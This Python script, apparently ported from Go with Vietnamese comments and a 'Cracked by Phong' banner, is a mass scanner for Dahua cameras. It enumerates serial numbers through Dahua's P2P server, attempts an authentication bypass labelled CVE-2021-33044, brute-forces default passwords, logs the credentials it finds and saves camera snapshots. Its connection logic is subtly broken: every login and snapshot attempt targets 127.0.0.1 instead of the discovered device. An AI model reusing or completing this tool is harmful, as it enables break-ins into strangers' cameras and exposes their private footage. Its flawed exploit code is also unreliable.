#!/usr/bin/env python3
# qcam.py - Port 1:1 tu Go sang Python
# Nguon: main.go, config.go, pool.go, engine.go, logger.go,
#        rpc2.go, p2p.go, hash.go, socket.go, stream.go, run.bat
# Requires: pip install requests
# Run: python qcam.py

import os
import sys
import json
import time
import socket
import hashlib
import hmac
import threading
import queue
import argparse
from datetime import datetime

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Thieu thu vien 'requests'. Chay: pip install requests")
    sys.exit(1)


# ============================================================
# config.go
# ============================================================
class Config:
    def __init__(self):
        self.input_prefix = "5E09A97PAJ"
        self.output_dir = "nghia"
        self.threads = 8999
        self.help = False


def parse_flags():
    parser = argparse.ArgumentParser(
        prog="QcamScanner",
        description="Dahua cameras security scanner vP2P",
        add_help=False,
    )
    parser.add_argument("-i", "--input", dest="input_prefix",
                        default="5E09A97PAJ")
    parser.add_argument("-o", "--output", dest="output_dir",
                        default="nghia")
    parser.add_argument("-t", "--threads", dest="threads", type=int,
                        default=8999)
    parser.add_argument("-h", "-?", "--help", dest="help",
                        action="store_true")

    args = parser.parse_args()

    cfg = Config()
    cfg.input_prefix = args.input_prefix
    cfg.output_dir = args.output_dir
    cfg.threads = args.threads
    cfg.help = args.help

    if cfg.help:
        print("[22:38:41] QcamScanner")
        print("[?] Dahua cameras security scanner vP2P")
        print("[-i, --input] Input file or specific target(s)")
        print("[-o, --output] Output directory")
        print("[-t, --threads] Number of threads")
        print("[-?, -h, --help] Get general help")
        sys.exit(0)

    return cfg


# ============================================================
# pool.go
# ============================================================
class WorkerPool:
    def __init__(self, workers, queue_size):
        self.num_workers = max(1, workers)
        self.job_queue = queue.Queue(maxsize=queue_size)
        self.active = 0
        self._lock = threading.Lock()
        self._workers = []
        self._running = False

    def start(self):
        self._running = True
        for _ in range(self.num_workers):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            self._workers.append(t)

    def _worker(self):
        while True:
            try:
                job = self.job_queue.get(timeout=0.5)
            except queue.Empty:
                if not self._running:
                    break
                continue
            if job is None:
                self.job_queue.task_done()
                break
            with self._lock:
                self.active += 1
            try:
                job()
            except Exception:
                pass
            finally:
                with self._lock:
                    self.active -= 1
                self.job_queue.task_done()

    def submit(self, job):
        self.job_queue.put(job)

    def stop(self):
        self._running = False
        for _ in range(self.num_workers):
            try:
                self.job_queue.put_nowait(None)
            except queue.Full:
                pass
        for t in self._workers:
            t.join(timeout=2)


# ============================================================
# logger.go
# ============================================================
class Logger:
    def __init__(self, output_dir, prefix, threads):
        os.makedirs(output_dir, exist_ok=True)
        self.path = os.path.join(output_dir, "QcamDmssUser.txt")
        self.file = open(self.path, "a", encoding="utf-8")
        self.lock = threading.Lock()

        header = (
            f"QcamScanner Beta | Bắt Đầu scan | vào > "
            f"{time.strftime('%d-%m-%Y %H:%M:%S')} | seri tạo > "
            f"{prefix} | ra > {output_dir} | Luồng > {threads}\n"
        )
        self.file.write(header)
        self.file.flush()

    def log_hit(self, serial, user, password):
        with self.lock:
            line = (
                f"[{time.strftime('%H:%M:%S')}] Found Camera -> "
                f"Serial: {serial} | User: {user} | Pass: {password}\n"
            )
            try:
                self.file.write(line)
                self.file.flush()
            except Exception:
                pass

    def close(self):
        with self.lock:
            try:
                self.file.close()
            except Exception:
                pass


# ============================================================
# hash.go
# ============================================================
def compute_md5_hash(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()


def compute_dahua_password_hash(user, password, realm, challenge) -> str:
    hash1 = compute_md5_hash(f"{user}:{realm}:{password}".encode())
    hash2 = compute_md5_hash(f"{user}:{challenge}:{hash1}".encode())
    return hash2


def verify_hmac_sha256(key: bytes, message: bytes, expected_mac: bytes) -> bool:
    mac = hmac.new(key, message, hashlib.sha256).digest()
    return hmac.compare_digest(mac, expected_mac)


# ============================================================
# rpc2.go
# ============================================================
class RPCRequest:
    def __init__(self, id_, method, params=None, session=""):
        self.data = {"id": id_, "method": method, "session": session}
        if params is not None:
            self.data["params"] = params

    def to_bytes(self):
        return json.dumps(self.data).encode()


class RPCResponse:
    def __init__(self, raw: bytes):
        try:
            obj = json.loads(raw.decode(errors="ignore"))
        except Exception:
            obj = {}
        self.id = obj.get("id", 0)
        self.result = bool(obj.get("result", False))
        self.params = obj.get("params")
        self.error = obj.get("error")
        self.session = obj.get("session", "")


class RPCClient:
    def __init__(self, conn, timeout):
        self.conn = conn
        self.timeout = timeout
        self.session = ""
        self.id = 1

    def call(self, method, params=None):
        self.id += 1
        req = RPCRequest(self.id, method, params, self.session)
        self.conn.settimeout(self.timeout)
        try:
            self.conn.sendall(req.to_bytes())
        except Exception as e:
            raise e

        buf = b""
        try:
            while True:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
                try:
                    json.loads(buf.decode(errors="ignore"))
                    break
                except Exception:
                    continue
        except socket.timeout:
            pass

        resp = RPCResponse(buf)
        if resp.session:
            self.session = resp.session
        return resp

    def global_login(self, user, password):
        params = {"userName": user, "password": password,
                  "clientType": "Mobile"}
        resp = self.call("global.login", params)
        return resp.result

    def system_get_device_info(self):
        resp = self.call("magicBox.getSystemInfo")
        return resp.params

    def user_manager_get_users(self):
        resp = self.call("userManager.getUsers")
        return resp.params

    def config_manager_get_config(self, name):
        params = {"name": name}
        resp = self.call("configManager.getConfig", params)
        return resp.params

    def global_logout(self):
        try:
            self.call("global.logout")
        except Exception:
            pass


# ============================================================
# socket.go
# ============================================================
class SocketHandler:
    def __init__(self, timeout):
        self.timeout = timeout

    def dial_tcp(self, address):
        try:
            host, port = address.rsplit(":", 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, int(port)))
            return s
        except Exception:
            return None

    def dial_udp(self, address):
        try:
            host, port = address.rsplit(":", 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            s.connect((host, int(port)))
            return s
        except Exception:
            return None

    def send_recv_udp(self, address, payload):
        conn = self.dial_udp(address)
        if conn is None:
            return None
        try:
            conn.send(payload)
            buf = conn.recv(2048)
            return buf
        except Exception:
            return None
        finally:
            try:
                conn.close()
            except Exception:
                pass

    @staticmethod
    def lookup_port(service):
        try:
            return socket.getservbyname(service, "tcp")
        except Exception:
            return -1


# ============================================================
# stream.go
# ============================================================
class StreamReader:
    def __init__(self, sock=None, fileobj=None, size=4096):
        self.sock = sock
        self.file = fileobj
        self.size = size
        self.buffer = b""

    def _recv(self, n=4096):
        if self.sock is not None:
            try:
                return self.sock.recv(n)
            except Exception:
                return b""
        if self.file is not None:
            try:
                return self.file.read(n)
            except Exception:
                return b""
        return b""

    def _fill(self, n):
        while len(self.buffer) < n:
            chunk = self._recv(self.size)
            if not chunk:
                break
            self.buffer += chunk
        return len(self.buffer)

    def buffered(self):
        return len(self.buffer)

    def discard(self, n):
        if n <= 0:
            return 0
        self._fill(n)
        n = min(n, len(self.buffer))
        self.buffer = self.buffer[n:]
        return n

    def peek(self, n):
        self._fill(n)
        return self.buffer[:n]

    def read(self, n):
        self._fill(n)
        n = min(n, len(self.buffer))
        out = self.buffer[:n]
        self.buffer = self.buffer[n:]
        return out

    def read_byte(self):
        return self.read(1)

    def read_line(self):
        while True:
            idx = self.buffer.find(b"\n")
            if idx >= 0:
                line = self.buffer[:idx + 1]
                self.buffer = self.buffer[idx + 1:]
                return line, False, None
            chunk = self._recv(self.size)
            if not chunk:
                if self.buffer:
                    line = self.buffer
                    self.buffer = b""
                    return line, True, None
                return b"", False, "EOF"
            self.buffer += chunk

    def read_slice(self, delim):
        while True:
            idx = self.buffer.find(delim)
            if idx >= 0:
                end = idx + len(delim)
                out = self.buffer[:end]
                self.buffer = self.buffer[end:]
                return out
            chunk = self._recv(self.size)
            if not chunk:
                out = self.buffer
                self.buffer = b""
                return out
            self.buffer += chunk

    def reset(self, sock=None, fileobj=None):
        self.sock = sock
        self.file = fileobj
        self.buffer = b""

    def size_(self):
        return self.size


# ============================================================
# p2p.go
# ============================================================
DAHUA_P2P_PORT = 8888
DAHUA_MEDIA_PORT = 37777
P2P_RELAY_PORT = 8800
P2P_HOST = "p2p.dahuasecurity.com"

DEFAULT_PASSWORDS = ["admin", "123456", "888888", "666666", ""]


class P2PTunnel:
    def __init__(self, serial, timeout):
        self.serial = serial
        self.timeout = timeout
        self.port = DAHUA_P2P_PORT

    def probe_realm(self):
        msg = f"DHP2P:Realm:opaque:{self.serial}".encode()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            s.connect((P2P_HOST, DAHUA_P2P_PORT))
            s.send(msg)
            buf = s.recv(1024)
            s.close()
            if b"200 OK" in buf or b"Realm" in buf:
                return True, None
            return False, None
        except Exception as e:
            return False, str(e)

    def _try_tcp_login(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect(("127.0.0.1", DAHUA_MEDIA_PORT))
            s.sendall(json.dumps(payload).encode())
            buf = b""
            try:
                while True:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    buf += chunk
                    try:
                        json.loads(buf.decode(errors="ignore"))
                        break
                    except Exception:
                        continue
            except socket.timeout:
                pass
            s.close()
            return buf
        except Exception:
            return b""

    def exploit_auth_bypass(self):
        req = {"Name": "admin", "Password": "",
               "ClientType": "Loopback", "Realm": "adminPlain"}
        data = json.dumps(req).encode()
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.settimeout(self.timeout)
            conn.connect(("127.0.0.1", DAHUA_MEDIA_PORT))
            conn.sendall(data)
            buf = conn.recv(1024)
            conn.close()
            if b'"result":true' in buf.lower() or b"session" in buf.lower():
                return "admin [CVE-2021-33044 Bypass]", "[EXPLOITED_NO_PASS]", True
        except Exception:
            pass
        return "", "", False

    def brute_force_passwords(self):
        for pw in DEFAULT_PASSWORDS:
            req = {"Name": "admin", "Password": pw}
            data = json.dumps(req).encode()
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.settimeout(self.timeout)
                conn.connect(("127.0.0.1", DAHUA_MEDIA_PORT))
                conn.sendall(data)
                buf = conn.recv(1024)
                conn.close()
                if b'"result":true' in buf.lower():
                    return "admin", pw, True
            except Exception:
                pass
        return "", "", False

    def download_snapshot(self, ip, user, password, output_dir):
        os.makedirs(output_dir, exist_ok=True)
        url = f"http://{ip}/cgi-bin/snapshot.cgi?channel=1"
        try:
            auth = (user, password) if user and password else None
            r = requests.get(url, auth=auth, timeout=5, verify=False)
            if r.status_code != 200:
                return False
            if r.content[:2] != b"\xFF\xD8":
                return False
            save_path = os.path.join(output_dir, f"{self.serial}.jpg")
            with open(save_path, "wb") as f:
                f.write(r.content)
            return True
        except Exception:
            return False


# ============================================================
# engine.go
# ============================================================
CHAR_SET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"


class Engine:
    def __init__(self, cfg):
        self.cfg = cfg
        self.logger = Logger(cfg.output_dir, cfg.input_prefix, cfg.threads)
        # Go cho phep 8999 goroutine, Python gioi han 500 threads
        safe_threads = min(max(cfg.threads, 1), 500)
        self.pool = WorkerPool(safe_threads, 5000)

        self.lock = threading.Lock()
        self.total = 100000
        self.scanned = 0
        self.online = 0
        self.hacked = 0
        self.deleted = 0

    def inc(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)

    def get(self, field):
        with self.lock:
            return getattr(self, field)

    def generate_serials(self, prefix, limit):
        if len(prefix) >= 10:
            yield prefix[:10]
            return

        needed = 10 - len(prefix)
        count = 0

        def dfs(curr, depth):
            nonlocal count
            if count >= limit:
                return
            if depth == 0:
                yield curr
                count += 1
                return
            for ch in CHAR_SET:
                if count >= limit:
                    return
                yield from dfs(curr + ch, depth - 1)

        yield from dfs(prefix, needed)

    def run(self):
        self.pool.start()

        reporter = threading.Thread(target=self.report_loop, daemon=True)
        reporter.start()

        serials = self.generate_serials(self.cfg.input_prefix, int(self.total))
        for serial in serials:
            s = serial

            def job(s=s):
                try:
                    self.process_serial(s)
                finally:
                    self.inc("scanned")

            self.pool.submit(job)

        self.pool.stop()
        self.logger.close()
        print("\n[+] QcamScanner finished task!")

    def process_serial(self, serial):
        tunnel = P2PTunnel(serial, 0.5)

        online, _err = tunnel.probe_realm()
        if not online:
            self.inc("deleted")
            return

        self.inc("online")

        user, password, success = tunnel.exploit_auth_bypass()
        if not success:
            user, password, success = tunnel.brute_force_passwords()

        if success:
            self.inc("hacked")
            self.logger.log_hit(serial, user, password)
            tunnel.download_snapshot("127.0.0.1", user, password,
                                     self.cfg.output_dir)

    def report_loop(self):
        while True:
            time.sleep(1)
            scanned = self.get("scanned")
            hacked = self.get("hacked")
            online = self.get("online")
            deleted = self.get("deleted")
            total = self.total or 1
            progress = scanned / total * 100.0

            print(
                f"\rTiến Độ = {progress:.1f}% | "
                f"ĐÃ HACK = {hacked} | Qcam Viet Nam | "
                f"TRỰC TUYẾN = {online} | ĐÃ XÓA = {deleted}",
                end="", flush=True,
            )

            if scanned >= total:
                break


# ============================================================
# run.bat
# ============================================================
def launcher():
    os.system("cls" if os.name == "nt" else "clear")

    print("===================================================")
    print("  Make By Nghia             Cracked by Phong")
    print("  NghiaVN")
    print("===================================================")
    print()
    print("  Dang khoi dong he thong, vui long cho...")
    print("  [########################################] 100%")
    print()
    print(" [OK] Khoi tao hoan tat!")
    print()
    print("===================================================")
    print()

    seri = "5E09A97PAJ"
    name = "hacked"

    try:
        choice_name = input("Ban co muon thay ten 'hacked' khong? (y/n): ").strip().lower()
    except EOFError:
        choice_name = "n"
    if choice_name == "y":
        try:
            name = input("Nhap ten moi: ").strip() or name
        except EOFError:
            pass

    print()

    try:
        choice_seri = input("Ban co muon thay seri '5E09A97PAJ' thanh cai khac khong? (y/n): ").strip().lower()
    except EOFError:
        choice_seri = "n"
    if choice_seri == "y":
        try:
            seri = input("Nhap seri moi: ").strip() or seri
        except EOFError:
            pass

    print()
    print("===================================================")
    print(f" Dang thuc thi lenh: VN.exe -i {seri} -o {name} -t 8999")
    print("===================================================")
    print()

    cfg = Config()
    cfg.input_prefix = seri
    cfg.output_dir = name
    cfg.threads = 8999

    try:
        eng = Engine(cfg)
        eng.run()
    except KeyboardInterrupt:
        print("\n[!] Da dung boi nguoi dung.")
    except Exception as e:
        print(f"[!] Loi: {e}")

    print()
    print("Hoan thanh! Nhan phim bat ky de thoat...")
    try:
        input()
    except EOFError:
        pass


# ============================================================
# main.go
# ============================================================
def main():
    if len(sys.argv) == 1:
        launcher()
        return

    cfg = parse_flags()

    try:
        eng = Engine(cfg)
    except Exception as e:
        print(f"[!] Fatal Error: {e}")
        sys.exit(1)

    eng.run()


if __name__ == "__main__":
    main()